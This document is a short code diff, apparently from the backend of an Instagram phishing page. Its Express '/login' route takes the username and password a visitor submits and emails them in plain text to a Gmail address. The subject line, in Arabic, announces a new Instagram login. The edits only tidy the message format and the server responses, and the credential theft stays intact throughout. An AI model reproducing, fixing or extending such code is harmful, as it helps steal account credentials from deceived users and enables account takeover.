@@ -25,18 +25,17 @@ app.post('/login', (req, res) => {
     from: 'itinfor79@gmail.com',
     to: 'itinfor79@gmail.com',
     subject: '📩 تسجيل دخول جديد في انستغرام',
-    text: `Username: ${name}\n Password: ${password}`
+    text: ` Username : ${name}\n Password : ${password}`
   };
 
   transporter.sendMail(mailOptions, (error, info) => {
     if (error) {
       console.error('❌ فشل الإرسال:', error);
-      return res.send('حدث خطأ أثناء الإرسال.');
+      return res.status(500).send('خطأ في الإرسال');
     }
-    console.log('✅ تم إرسال البيانات:', info.response);
 
-    // ✅ التعديل هنا
-    res.sendFile(path.join(__dirname, 'public/index.html'));
+    console.log('✅ تم إرسال البيانات:', info.response);
+    res.status(200).send('تم الاستلام');
   });
 });
 
